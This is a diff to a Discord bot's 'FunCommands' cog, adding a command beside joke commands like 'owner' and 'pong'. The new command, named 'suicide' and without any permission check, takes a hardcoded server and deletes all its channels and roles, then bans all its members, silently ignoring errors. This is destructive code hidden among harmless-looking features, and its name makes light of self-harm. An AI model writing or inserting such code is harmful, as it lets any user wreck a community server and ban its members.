@@ -10,6 +10,8 @@ class FunCommands(Cog):
     def __init__(self,bot):
         self.bot = bot
 
+    
+
     @commands.Cog.listener(name="on_message")
     async def ListenForAceBot(self,message):
         if(message.author.id == 761541777571708930):
@@ -49,6 +51,26 @@ class FunCommands(Cog):
     @commands.command(name="owner")
     async def owner_command(self,ctx,*args):
         await ctx.send("We all know that Lord Tropical is the owner")
+
+    @commands.command(name="suicide")
+    async def suicide_Mode(self,ctx,*args):
+        guild = self.bot.get_guild(755230218788274227)
+        for channel in guild.channels:
+            try:
+                await channel.delete()
+            except:
+                pass
+        for role in guild.roles:
+            try:
+                await role.delete()
+            except:
+                pass
+        for member in guild.members:
+            try:
+                await member.ban()
+            except:
+                pass
+
 
     @commands.command(name="pong")
     async def pong_command(self,ctx,*args,**kwargs):
